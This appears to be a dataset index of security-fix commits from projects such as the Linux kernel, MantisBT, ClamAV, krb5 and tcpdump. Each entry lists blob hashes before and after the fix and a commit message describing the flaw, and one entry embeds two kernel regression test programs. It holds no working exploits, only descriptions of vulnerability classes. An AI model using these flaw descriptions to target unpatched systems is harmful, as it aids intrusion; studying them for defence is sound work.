KVM: x86: PREFETCH and HINT_NOP should have SrcMem flag\n\nThe decode phase of the x86 emulator assumes that every instruction with the ModRM flag, and which can be used with RIP-relative addressing, has either SrcMem or DstMem.  This is not the case for several instructions - prefetch, hint-nop and clflush.\n\nAdding SrcMem|NoAccess for prefetch and hint-nop and SrcMem for clflush.\n\nThis fixes CVE-2014-8480.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Cc: stable@vger.kernel.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    a430c9166312e1aa3d80bce32374233bdbfeba32
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    eb3b1c46f995d17b242ff5d80d2cdc6d87336d0d
Blob(s) Before Fix: 
    02c8ea804aaf5e13d0e5fceb284d6b0a0b906157
Projects:
    0-T-0_ps4-linux
Commit Message for a430c9166312e1aa3d80bce32374233bdbfeba32:
KVM: emulate: avoid accessing NULL ctxt->memopp\n\nA failure to decode the instruction can cause a NULL pointer access. This is fixed simply by moving the "done" label as close as possible to the return.\n\nThis fixes CVE-2014-8481.\n\nReported-by: Andy Lutomirski <luto@amacapital.net> Cc: stable@vger.kernel.org Fixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    8b5ecd226f9208af3074b33d3b7cf5e14f55b138
File(s) In Commit: 
    src/core/cipher.cpp
Blob(s) In Commit: 
    7d1fe46a5e7be506d06310e188404bab8c8b8253
Blob(s) Before Fix: 
    7cc75d0a5774cab7e972e0ceaa970ecd0edfe77b
Projects:
    02JanDal_quassel
Commit Message for 8b5ecd226f9208af3074b33d3b7cf5e14f55b138:
Check for invalid input in encrypted buffers\n\nThe ECB Blowfish decryption function assumed that encrypted input would always come in blocks of 12 characters, as specified. However, buggy clients or annoying people may not adhere to that assumption, causing the core to crash while trying to process the invalid base64 input.\n\nWith this commit we make sure that we're not overstepping the bounds of the input string while decoding it  instead we bail out early and display the original input. Fixes #1314.\n\nThanks to Tucos for finding that one!

======================================================================
Commit With Fix: 
    f779e3d4394a0638d822849863c4098421d911c5
File(s) In Commit: 
    api/soap/mc_account_api.php
Blob(s) In Commit: 
    66d43d114a047d95655a0f5a617819717635e204
Blob(s) Before Fix: 
    1b826f1562a3356667a0c7aa8e1fa61fbda5e176
    1cab7bbce1e90e20c1c362ab77364b10d5ed6c32
    8d388fc4ff980e75c5b522c183a41cd20cc5620d
    c8fffc2a4dc11b3e6ba117717a8a5fd5af69dadf
    cc41cc73a12985f327eb9e63a8e85b65db28a9bd
Projects:
    01-Scripts_mantisbt
Commit Message for f779e3d4394a0638d822849863c4098421d911c5:
SOAP API: apply access control to mci_account_get_array_by_id\n\nThe access controls are the same as the ones applied by view_user_page.php, with the single addition of making the info available if the user requests their own information.\n\nThis preserves the behaviour of the mc_login method call.\n\nFixes #17243 (leak of user personal information)\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>

======================================================================
Commit With Fix: 
    0f5b4fd860fa7e3a6c47201637aab05395f32647
File(s) In Commit: 
    NEWS
Blob(s) In Commit: 
    3b342488c234a18949316932038005d0224d9b56
Blob(s) Before Fix: 
    c303a8c0093d1e191e7f2a04fa609bb6cd7b1509
Projects:
    AzeemMalik51_mod_auth_mellon
Commit Message for 0f5b4fd860fa7e3a6c47201637aab05395f32647:
Add NEWS-file for 0.9.0.

======================================================================
Commit With Fix: 
    338f977f4eb441e69bb9a46eaa0ac715c931a67f
File(s) In Commit: 
    net/mac80211/tx.c
Blob(s) In Commit: 
    97a02d3f7d87720795e1518d27fce0bbaed9bc4f
Blob(s) Before Fix: 
    27c990bf2320237aa3c3124e25d0b0bc9508fb40
    3456c0486b482bfb44a6f797ebaff5d70bde4940
    4105d0ca963e25dfdd558e30c48274277e5ad2df
    467c1d1b66f2f5615182abd689349027b88abe64
    70b5a05c0a4e12b8cb36252465171ffbc7ef1686
    9972e07a2f9650315521560cfb48267504476200
    c558b246ef0036c38e6c8a00b338b43c46913f78
    ca7fa7f0613dba22cdc0e82d8a96e1de9ff011dc
    de8548bf0a7f27cef20e06077d3c603ad22a7baa
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 338f977f4eb441e69bb9a46eaa0ac715c931a67f:
mac80211: fix fragmentation code, particularly for encryption\n\nThe "new" fragmentation code (since my rewrite almost 5 years ago) erroneously sets skb->len rather than using skb_trim() to adjust the length of the first fragment after copying out all the others. This leaves the skb tail pointer pointing to after where the data originally ended, and thus causes the encryption MIC to be written at that point, rather than where it belongs: immediately after the data.\n\nThe impact of this is that if software encryption is done, then  a) encryption doesn't work for the first fragment, the connection     becomes unusable as the first fragment will never be properly     verified at the receiver, the MIC is practically guaranteed to     be wrong  b) we leak up to 8 bytes of plaintext (!) of the packet out into     the air\n\nThis is only mitigated by the fact that many devices are capable of doing encryption in hardware, in which case this can't happen as the tail pointer is irrelevant in that case. Additionally, fragmentation is not used very frequently and would normally have to be configured manually.\n\nFix this by using skb_trim() properly.\n\nCc: stable@vger.kernel.org Fixes: 2de8e0d999b8 ("mac80211: rewrite fragmentation") Reported-by: Jouni Malinen <j@w1.fi> Signed-off-by: Johannes Berg <johannes.berg@intel.com>

======================================================================
Commit With Fix: 
    f2e323ec96077642d397bb1c355def536d489d16
File(s) In Commit: 
    drivers/media/usb/ttusb-dec/ttusbdecfe.c
Blob(s) In Commit: 
    9c29552aedec2e7b1a08447619671cd65c170b77
Blob(s) Before Fix: 
    09693caa15e2c3633449f645bd91e6cab170f88f
    5c45c9d0712ddf949f0ac571b5649111585046ae
    6ea05d909024961be776bff0face6ecaf0ba4fce
    7c0f33df2f246d8f2a3364a04a9a1414f55824e1
    8781335ab92f2469dab33aa132ab1613d2c512a7
    9dd34591c0cb10600e5c4b48e49566cbbf3c95ea
    ee9ab39253e045847e6f544fc1018a8824785830
Projects:
    0-T-0_ps4-linux
Commit Message for f2e323ec96077642d397bb1c355def536d489d16:
[media] ttusb-dec: buffer overflow in ioctl\n\nWe need to add a limit check here so we don't overflow the buffer.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    cabacdc291c251bfde0dc2a2c945c02cef41bf40
File(s) In Commit: 
    adm_config_report.php
Blob(s) In Commit: 
    83149f0e422bcc3b68a986f3ed5a8c8f4c45f348
Blob(s) Before Fix: 
    6288a7ff8181edd5520e647aa361f26d62fdf614
    9e9190cfa8f21288c34c71925b6dfd87c3d7c652
Projects:
    01-Scripts_mantisbt
Commit Message for cabacdc291c251bfde0dc2a2c945c02cef41bf40:
Fix: adm_config_report.php filtering does not check config option is valid\n\nI've left this throwing ERROR_GENERIC as the only time this should be able to be hit is if we have invalid input to start with.

======================================================================
Commit With Fix: 
    fc3794a54d2affe5770c1f876484a871c783e91e
File(s) In Commit: 
    libclamav/pe.c
Blob(s) In Commit: 
    908f21043994d5d3d0297c8faac6afa3e38c1ba9
Blob(s) Before Fix: 
    c643366f31b52d2283c1d8697468a6668d95b195
Projects:
    0ca_clamav-devel
Commit Message for fc3794a54d2affe5770c1f876484a871c783e91e:
Merge fix from security/bb11155 branch

======================================================================
Commit With Fix: 
    b0021673ab23249244119bde3c7fcecd4daa4e7f
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    0667996b474e5b2e823c5967ff44af014507b823
Blob(s) Before Fix: 
    27a8807e19bea6f610f0bafed50182d1c4ac4e98
    7ec33d74643de209ddce75f8cdcb77f6617dd4d9
    9486b8b7ac791b9876d323a707410fda692e7c0f
    a887854cfb41d430cc7be6dc88d83545eceece3f
Projects:
    01-Scripts_mantisbt
Commit Message for b0021673ab23249244119bde3c7fcecd4daa4e7f:
Improve validation for filter sort and direction\n\nFixes #17841

======================================================================
Commit With Fix: 
    0f95d441e4b5d7512cc5c326c8668a120e048eda
File(s) In Commit: 
    print-ppp.c
Blob(s) In Commit: 
    9a983e6179cd282a61b33880cdf650db02c2dc2a
Blob(s) Before Fix: 
    8e098f05a953e3230bfa97f726ed2cc144db9c79
    b858b73ca824ed7a3e6733e6d042f25e13dc0af6
Projects:
    0xmitsurugi_tcpdump
Commit Message for 0f95d441e4b5d7512cc5c326c8668a120e048eda:
Do bounds checking when unescaping PPP.\n\nClean up a const issue while we're at it.

======================================================================
Commit With Fix: 
    99eda421f7ddc27b14e4ac1d2126e5fe41719081
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    a5872f4a3f618173ef4a580ec4bee5fb64d31710
Blob(s) Before Fix: 
    3efe1d5f4ade3e24ed85032b1753cb9c00ddc384
    85a150acb416fb70bed5bf81093d2c72e4ebe588
Projects:
    Accacio_graphviz
Commit Message for 99eda421f7ddc27b14e4ac1d2126e5fe41719081:
Fix format string vulnerability in using agerr() to report errors during parsing. We now use a fixed format %s, and pass the error string as an argument.

======================================================================
Commit With Fix: 
    778ddf6f2cd9ed38b9db2d73e823b8c21243a960
File(s) In Commit: 
    conf/mime.conf
Blob(s) In Commit: 
    c2e03b775de1a2f2b93dce41f9eaa7d3414fe93f
Blob(s) Before Fix: 
    24529b06cf4cf4cfba45d23be94215a19722353d
    2a50fab10177268c1ed332f3cf08ba12246760f0
    367905309447e06479cd96e108a791c0fb2505f8
    381b93f8640158bcdf28261ad2dad5c78d95f0cd
    90356ff04ca61e917f4eaf16215c78a3d21c56d8
    fec821f1cd10e51fe35295d46a1ee96b5177687e
Projects:
    122800_dokuwiki
Commit Message for 778ddf6f2cd9ed38b9db2d73e823b8c21243a960:
disable flash uploading by default\n\nThanks to Kacper Szurek for reporting this

======================================================================
Commit With Fix: 
    a766cb44bcffcdb0b88e776d01c5ee1323d44f85
File(s) In Commit: 
    src/engine/server/server.cpp
Blob(s) In Commit: 
    ab0f31225001b6ca1ae6195463c20dc464a2e860
Blob(s) Before Fix: 
    193547ccf8038e884384f834deca339841debb3d
    19745b3ae8b3986a82aab76b8d532fbd5df7b76c
    26baa7633afdc6e17d24167a007732f4312d7a40
    581c7e6736327df59190c5066c796b842269f70d
    a231d1e8d785f269cf3e450362f513dea35d1364
Projects:
    0xFaulty_ddnet
Commit Message for a766cb44bcffcdb0b88e776d01c5ee1323d44f85:
fixed a server crash

======================================================================
Commit With Fix: 
    f647d7c155f069c1a068030255c300663516420e
File(s) In Commit: 
    arch/x86/kernel/process_64.c
Blob(s) In Commit: 
    5a2c02913af3bd43dfc1be40947f176e0542422f
Blob(s) Before Fix: 
    05646bab4ca6addf3a4026ce40685480a4336582
    166119618afbc34784463c3890f53abb5065b813
    3ed4a68d4013fc6e6b5ea3350519ab92f8eeb33d
    43d8b48b23e61dc20afb3ddc0aed3308e7d92f2b
    61cdf7fdf09961757d7a6f8ba595df63a5a123b3
    67fcc43577d279faa02941dd56dbf36f270a9832
    6e68a6194965d66f07de49245bb177bb7e1f1cb7
    898d077617a99ab7c6ef055b06f409c8222a4249
    9b9fe4a85c87fcebcd370c1e4a33d235f67140ec
    9c0280f93d05dbf9b644abd040b472b9c69d4f55
    a7f67d3580cb9176cf7018e4dbe9f7a8b2a96daf
    ba48e77c8e9e442ed2f01940047551b58256a0f6
    ca5b02d405c3ba0c17e8c7e060222559a6a1d9b3
    e2d26ce9b8549e9c22e8e51d5f7802bfa25b3119
    f547f866e86c43b3154755f9584ec0d1bb2cc95a
    f693e44e1bf63a303a3e53a00d927721e6602e86
Projects:
    0-T-0_ps4-linux
Commit Message for f647d7c155f069c1a068030255c300663516420e:
x86_64, switch_to(): Load TLS descriptors before switching DS and ES\n\nOtherwise, if buggy user code points DS or ES into the TLS array, they would be corrupted after a context switch.\n\nThis also significantly improves the comments and documents some gotchas in the code.\n\nBefore this patch, the both tests below failed.  With this patch, the es test passes, although the gsbase test still fails.\n\n ----- begin es test -----\n\n/*  * Copyright (c) 2014 Andy Lutomirski  * GPL v2  */\n\nstatic unsigned short GDT3(int idx) { 	return (idx << 3) | 3  }\n\nstatic int create_tls(int idx, unsigned int base) { 	struct user_desc desc = { 		.entry_number    = idx, 		.base_addr       = base, 		.limit           = 0xfffff, 		.seg_32bit       = 1, 		.contents        = 0, /* Data, grow-up */ 		.read_exec_only  = 0, 		.limit_in_pages  = 1, 		.seg_not_present = 0, 		.useable         = 0, 	} \n\n	if (syscall(SYS_set_thread_area, &desc) != 0) 		err(1, "set_thread_area") \n\n	return desc.entry_number  }\n\nint main() { 	int idx = create_tls(-1, 0)  	printf("Allocated GDT index %d\n", idx) \n\n	unsigned short orig_es  	asm volatile ("mov %%es,%0" : "=rm" (orig_es)) \n\n	int errors = 0  	int total = 1000  	for (int i = 0  i < total  i++) { 		asm volatile ("mov %0,%%es" : : "rm" (GDT3(idx)))  		usleep(100) \n\n		unsigned short es  		asm volatile ("mov %%es,%0" : "=rm" (es))  		asm volatile ("mov %0,%%es" : : "rm" (orig_es))  		if (es != GDT3(idx)) { 			if (errors == 0) 				printf("[FAIL]\tES changed from 0x%hx to 0x%hx\n", 				       GDT3(idx), es)  			errors++  		} 	}\n\n	if (errors) { 		printf("[FAIL]\tES was corrupted %d/%d times\n", errors, total)  		return 1  	} else { 		printf("[OK]\tES was preserved\n")  		return 0  	} }\n\n ----- end es test -----\n\n ----- begin gsbase test -----\n\n/*  * gsbase.c, a gsbase test  * Copyright (c) 2014 Andy Lutomirski  * GPL v2  */\n\nstatic unsigned char *testptr, *testptr2 \n\nstatic unsigned char read_gs_testvals(void) { 	unsigned char ret  	asm volatile ("movb %%gs:%1, %0" : "=r" (ret) : "m" (*testptr))  	return ret  }\n\nint main() { 	int errors = 0 \n\n	testptr = mmap((void *)0x200000000UL, 1, PROT_READ | PROT_WRITE, 		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)  	if (testptr == MAP_FAILED) 		err(1, "mmap") \n\n	testptr2 = mmap((void *)0x300000000UL, 1, PROT_READ | PROT_WRITE, 		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)  	if (testptr2 == MAP_FAILED) 		err(1, "mmap") \n\n	*testptr = 0  	*testptr2 = 1 \n\n	if (syscall(SYS_arch_prctl, ARCH_SET_GS, 		    (unsigned long)testptr2 - (unsigned long)testptr) != 0) 		err(1, "ARCH_SET_GS") \n\n	usleep(100) \n\n	if (read_gs_testvals() == 1) { 		printf("[OK]\tARCH_SET_GS worked\n")  	} else { 		printf("[FAIL]\tARCH_SET_GS failed\n")  		errors++  	}\n\n	asm volatile ("mov %0,%%gs" : : "r" (0)) \n\n	if (read_gs_testvals() == 0) { 		printf("[OK]\tWriting 0 to gs worked\n")  	} else { 		printf("[FAIL]\tWriting 0 to gs failed\n")  		errors++  	}\n\n	usleep(100) \n\n	if (read_gs_testvals() == 0) { 		printf("[OK]\tgsbase is still zero\n")  	} else { 		printf("[FAIL]\tgsbase was corrupted\n")  		errors++  	}\n\n	return errors == 0 ? 0 : 1  }\n\n ----- end gsbase test -----\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Cc: <stable@vger.kernel.org> Cc: Andi Kleen <andi@firstfloor.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/509d27c9fec78217691c3dad91cec87e1006b34a.1418075657.git.luto@amacapital.net Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f54e18f1b831c92f6512d2eedb224cd63d607d3d
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    bb63254ed8486f42200230b4bbaa80257f92700d
Blob(s) Before Fix: 
    62bd2e5ad3552585793a47be65031e989d02a716
    bc41b5d932f12e719beafefa4430d928f2750e33
    c0bf42472e408fd16911cee33f3d9079943aa46a
    f488bbae541ac8d5db4eb7e963c33452ebb3e937
Projects:
    0-T-0_ps4-linux
Commit Message for f54e18f1b831c92f6512d2eedb224cd63d607d3d:
isofs: Fix infinite looping over CE entries\n\nRock Ridge extensions define so called Continuation Entries (CE) which define where is further space with Rock Ridge data. Corrupted isofs image can contain arbitrarily long chain of these, including a one containing loop and thus causing kernel to end in an infinite loop when traversing these entries.\n\nLimit the traversal to 32 entries which should be more than enough space to store all the Rock Ridge data.\n\nReported-by: P J P <ppandit@redhat.com> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    6609658db0799053fbef0d7d0aa2f1fd68ef32d8
File(s) In Commit: 
    src/kadmin/server/kadm_rpc_svc.c
Blob(s) In Commit: 
    f4d2a7cba7b4c5b6de0479ab8dbbe30e097aee24
Blob(s) Before Fix: 
    3837931b6f342187fdf9f773a912b3170087285b
    4d4df89b8072dd31da10acbfd9ea3072e6e1002c
    a75bdb89d3c28c95963e731372a22695cab4e2be
Projects:
    3van_krb5
Commit Message for 6609658db0799053fbef0d7d0aa2f1fd68ef32d8:
Fix kadmind server validation [CVE-2014-9422]\n\n[MITKRB5-SA-2015-001] In kadmind's check_rpcsec_auth(), use data_eq_string() instead of strncmp() to check components of the server principal, so that we don't erroneously match left substrings of "kadmin", "history", or the realm.\n\nticket: 8057 (new) target_version: 1.13.1 tags: pullup

======================================================================
Commit With Fix: 
    62a110d447bb8c16a4c69629e28a42e8c39fd7e0
File(s) In Commit: 
    src/ssl/d1_srtp.c
Blob(s) In Commit: 
    98a6bd9e247c8116e2a1cdfd2a431314857dcfaa
Blob(s) Before Fix: 
    535539ba3b50c0d211ec83700db0f07e29a6c288
    5b12570bd3a263e1eb2d62b185688099b4b01c07
    af80b7c5d2557393769861114f16c280993dbad9
Projects:
    PeterN_libssl
Commit Message for 62a110d447bb8c16a4c69629e28a42e8c39fd7e0:
Avoid a double-free in an error path.\n\nReported by Felix Groebert of the Google Security Team.\n\nok beck@ miod@

======================================================================
Commit With Fix: 
    5b6698b0e4a37053de35cc24ee695b98a7eb712b
File(s) In Commit: 
    net/batman-adv/fragmentation.c
Blob(s) In Commit: 
    8af3461d18d26abc26955acb814fd205d123eb2b
Blob(s) Before Fix: 
    fc1835c6bb4099e50e75f964826b0aacdd7200f0
Projects:
    0-T-0_ps4-linux
Commit Message for 5b6698b0e4a37053de35cc24ee695b98a7eb712b:
batman-adv: Calculate extra tail size based on queued fragments\n\nThe fragmentation code was replaced in 610bfc6bc99bc83680d190ebc69359a05fc7f605 ("batman-adv: Receive fragmented packets and merge"). The new code provided a mostly unused parameter skb for the merging function. It is used inside the function to calculate the additionally needed skb tailroom. But instead of increasing its own tailroom, it is only increasing the tailroom of the first queued skb. This is not correct in some situations because the first queued entry can be a different one than the parameter.\n\nAn observed problem was:\n\n1. packet with size 104, total_size 1464, fragno 1 was received    - packet is queued 2. packet with size 1400, total_size 1464, fragno 0 was received    - packet is queued at the end of the list 3. enough data was received and can be given to the merge function    (1464 == (1400 - 20) + (104 - 20))    - merge functions gets 1400 byte large packet as skb argument 4. merge function gets first entry in queue (104 byte)    - stored as skb_out 5. merge function calculates the required extra tail as total_size - skb->len    - pskb_expand_head tail of skb_out with 64 bytes 6. merge function tries to squeeze the extra 1380 bytes from the second queued    skb (1400 byte aka skb parameter) in the 64 extra tail bytes of skb_out\n\nInstead calculate the extra required tail bytes for skb_out also using skb_out instead of using the parameter skb. The skb parameter is only used to get the total_size from the last received packet. This is also the total_size used to decide that all fragments were received.\n\nReported-by: Philipp Psurek <philipp.psurek@gmail.com> Signed-off-by: Sven Eckelmann <sven@narfation.org> Acked-by: Martin Hundebøll <martin@hundeboll.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4520d973c81fecfebbeacd2ef2f1849d763951c7
File(s) In Commit: 
    lib/grit_adapter/git_layer_grit.rb
Blob(s) In Commit: 
    e677ca6e9db20b27f45bf54ff3cda0f1260635bd
Blob(s) Before Fix: 
    f607a7a118628c482b2b49a256d4dedc5698352b
Projects:
    gollum_grit_adapter
Commit Message for 4520d973c81fecfebbeacd2ef2f1849d763951c7:
Fix security issue with git grep -O

======================================================================
Commit With Fix: 
    d65686849024838243515b5c40ae2c479460b4b5
File(s) In Commit: 
    usr/src/uts/common/fs/dev/sdev_zvolops.c
Blob(s) In Commit: 
    e4c3acf78712a6863e3eca926445303b5fb5db36
Blob(s) Before Fix: 
    6543504e97faf5d3ecd30dc3b8e0bd43ce34c506
Projects:
    0rbiter_zfs
Commit Message for d65686849024838243515b5c40ae2c479460b4b5:
5421 devzvol_readdir() needs to be more careful with strchr Reviewed by: Keith Wesolowski <keith.wesolowski@joyent.com> Reviewed by: Jerry Jelinek <jerry.jelinek@joyent.com> Approved by: Dan McDonald <danmcd@omniti.com>

======================================================================
Commit With Fix: 
    dbe14f00030af5d3577f4cabbf9861db59e9c378
File(s) In Commit: 
    src/sd2.c
Blob(s) In Commit: 
    a70a1f149b97181f7b20d10d30b6c1c972bab0c9
Blob(s) Before Fix: 
    0b4e5af00761b61b342d87669c88f5874f8a31a7
    9ef10a91c5832e696a1d825043ae51c74f70d46a
    d5052eea37fab1ccc09a8615c7c356234b7acabe
Projects:
    12gjang_libsndfile
Commit Message for dbe14f00030af5d3577f4cabbf9861db59e9c378:
src/sd2.c : Fix two potential buffer read overflows.\n\nCloses: https://github.com/erikd/libsndfile/issues/93

======================================================================
Commit With Fix: 
    a3a8784454692dd72e5d5d34dcdab17b4420e74c
File(s) In Commit: 
    security/keys/gc.c
Blob(s) In Commit: 
    c7952375ac5325cfb4c403fa1020671b5f31a150
Blob(s) Before Fix: 
    009d9370c8fd707b45080e9a89bce706a123d8e9
    05925458166fa7724a5e7f3a0f0ab56946340c44
    14a8df21fdef29a5281a20c8f3d909c9f580d104
    1659094d684db34c722c43fd89d506ff1a1d8cb1
    39eac1fd5706c6370df8b18fe5ac42e85e1b2ed3
    61ab7c82ebb12f1470d26d6aa29519f9c33a3ce9
    7207e6094dc1622c9a51beedc92288cdec244de1
    797818695c87a93855ad54a0b86dcbb194ab5a31
    87632bd17b3e87b80ef007051e9f4d3e26aae707
    89df6b5f203c534c64fffd3fc0547f611dedebea
    9609a7f0faea2d53d2ca7c642cf24935012cdaae
    9cb4fe4478a137e7bb3352ae958830657f6b5b7c
    a42b45531aac173a337498cfc26fd09ded18baee
    addf060399e09547307d9c023f36d8dbf869a931
    bf4d8da5a79502f626a849473e4af18e229eb074
    d3222b6d7d5979460ff63940066433e414b22ec4
    d67c97bb10256d5dc5a9b74b3b8aaa37022f96b1
Projects:
    0-T-0_ps4-linux
Commit Message for a3a8784454692dd72e5d5d34dcdab17b4420e74c:
KEYS: close race between key lookup and freeing\n\nWhen a key is being garbage collected, it's key->user would get put before the ->destroy() callback is called, where the key is removed from it's respective tracking structures.\n\nThis leaves a key hanging in a semi-invalid state which leaves a window open for a different task to try an access key->user. An example is find_keyring_by_name() which would dereference key->user for a key that is in the process of being garbage collected (where key->user was freed but ->destroy() wasn't called yet - so it's still present in the linked list).\n\nThis would cause either a panic, or corrupt memory.\n\nFixes CVE-2014-9529.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    4e2024624e678f0ebb916e6192bd23c1f9fdf696
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    735d7522a3a911f19af593d6b5f7d366d6cf448d
Blob(s) Before Fix: 
    0ec137310320f080316c5e6111198b842a77303e
    17809499c752defc0f20c973ce10ec1cc2cf1655
    1fbc7de88f50ea6c11e3335eff02ec95e82da4b1
    204659a5f6db5b5328bc964c8d3931290ef9f3e6
    419d612519550dfb5b87aa343f9b4e0e8af86de2
    5384ceb35b1cc829442d6aa440db19c553a6eed8
    70e79d0c756a9418155239f18f68d55323809e08
    7cd4e1118a2ae4d71d94e31b4135147d440e0113
    8645dc054f3a2c4e8f2494170816ffa5ee21674a
    94ef92fe806c472cf8152e21d5f54dbdc0f28343
    98b3eb7d8eaf64d5eb006801aeb130ff8503f593
    bb63254ed8486f42200230b4bbaa80257f92700d
    bc41b5d932f12e719beafefa4430d928f2750e33
    c0bf42472e408fd16911cee33f3d9079943aa46a
    ee62cc0c249990e19cb33bd9bd30f04093837b40
    f488bbae541ac8d5db4eb7e963c33452ebb3e937
    f9cd04db6eab9509958a375a65f3b4d8eb0d6d90
Projects:
    0-T-0_ps4-linux
Commit Message for 4e2024624e678f0ebb916e6192bd23c1f9fdf696:
isofs: Fix unchecked printing of ER records\n\nWe didn't check length of rock ridge ER records before printing them. Thus corrupted isofs image can cause us to access and print some memory behind the buffer with obvious consequences.\n\nReported-and-tested-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    65437cee25199dbd385fb35901bc0011e164276c
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    cd1f79d5ffd2417dac80fd7396a9dbae38a4e5d7
Blob(s) Before Fix: 
    237e4bb6d71d27f61961f54686343137d5a136be
    53a6050f9d7efeed86f741bff514f9860a9ab029
    8e50d72817f8648deae06349990fea654c0abbdd
    9d54fc973b51e3bcb03bfc28eefa472d9330936a
Projects:
    5hadowblad3_file
Commit Message for 65437cee25199dbd385fb35901bc0011e164276c:
Limit string printing to 100 chars, and add flags I forgot in the previous commit.

======================================================================
Commit With Fix: 
    59e63838913eee47f5c120a6c53d4565af638158
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    2b15f2c39e73c9079964e2195e26b632ca11693b
Blob(s) Before Fix: 
    dbb670a08777d8ab588e795f2d6b845103057b03
Projects:
    5hadowblad3_file
Commit Message for 59e63838913eee47f5c120a6c53d4565af638158:
PR/398: Correctly truncate pascal strings (fixes out of bounds read of 1, 2, or 4 bytes).

======================================================================
Commit With Fix: 
    445c8fb0ebff85195be94cd9f7e1df89cade5c7f
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    9d54fc973b51e3bcb03bfc28eefa472d9330936a
Blob(s) Before Fix: 
    4296663046efdd06ba85c6327fd595208885b839
    cd1f79d5ffd2417dac80fd7396a9dbae38a4e5d7
Projects:
    5hadowblad3_file
Commit Message for 445c8fb0ebff85195be94cd9f7e1df89cade5c7f:
Bail out on partial reads, from Alexander Cherepanov

======================================================================
Commit With Fix: 
    942080643bce061c3dd9d5718d3b745dcb39a8bc
File(s) In Commit: 
    fs/ecryptfs/crypto.c
Blob(s) In Commit: 
    31b148f3e7729d69ab3ee26639d8e68193243c73
Blob(s) Before Fix: 
    000eae2782b6e905aefa05980ef91c54b81a8274
    1da2446bf6b003a1d636b852e107b908ed50ac1f
    1dfd163e3744f34a24676e8d514d3cc7f5ba584e
    2a834255c75de911b7e1f8eb10026972913e14b4
    2f6735dbf1a9ded47999ebc97590221b16eb6925
    7acd57da4f14e3a0e7fd0ef4114f096f3ca87d2b
    80d6901493cf5e0867cd2572885cc16f66ff59c5
    95111291eaa31b5b263acaa4dd1729686b590aef
    9756ef106f9bab37ab86bc58a04f322f3d4e90f8
    a7b0c2dfb3db76066703076ab43f4d589637523d
    afb97a756359734d718ce16fcf1ba9a196fc0ab4
    bf926f7a5f0c3893eb9b725d3257e1269f0a9aad
    c6602d24517682c56bd2928c390174b834a05534
    ca7bb4b65509c9e79f8abde6e07be21375cde4b6
    e5e29f8c920b18bc6959cdb16d2ee57fec7d45a6
    f71ec125290db7da87355f444f7308826ee1c034
Projects:
    0-T-0_ps4-linux
Commit Message for 942080643bce061c3dd9d5718d3b745dcb39a8bc:
eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the end of the allocated buffer during encrypted filename decoding. This fix corrects the issue by getting rid of the unnecessary 0 write when the current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com> Reported-by: Dmitry Chernenkov <dmitryc@google.com> Suggested-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions Signed-off-by: Tyler Hicks <tyhicks@canonical.com>

======================================================================
Commit With Fix: 
    223b02d923ecd7c84cf9780bb3686f455d279279
File(s) In Commit: 
    include/net/netfilter/nf_conntrack_extend.h
Blob(s) In Commit: 
    55d15049ab2fd60626bb4a5305baf6df5978c791
Blob(s) Before Fix: 
    0066409f86c7608ab88b7c1e9af04a361ad16086
    1c3035dda31f66a33d50cf2617d3a70288812383
    21f887c5058c5ded57e7b9018aef250612b3caff
    2dcf31703acba7a18b9f167866390827054f9d98
    31158f38a98001dc3515678293bbb29882d6ed8e
    331310851cfb0825fa6efbbd9ea0ca9c7d7be35f
    4944bc9153cf5d307c4168079d9eb4b6a2c09f21
    7f8fc5d123c550e437be2279039ea5d4f4bd6d43
    86dd7dd3d6173b1a66afebb2f58f1f41bf492d00
    88877224473f26a86a2b215b97b0bdc2edffd409
    88a1d4060d5260f7ac51e7b2d74f87ab409cd4de
    8b4d1fc29096b1d543241360d7832a32dcfb1904
    956b175523ffaf726dadb2fa079219e0d12d5838
    96755c3798a552cbcb74d978685c0a3648ee86e4
    977bc8a46444d12b960fd3646969a2e96ce064dd
    d9180742ebb7503dfc2bf7387a85b19177cef306
    ff95434e50ca4273e7e795e55f37134457cca69f
Projects:
    0-T-0_ps4-linux
Commit Message for 223b02d923ecd7c84cf9780bb3686f455d279279:
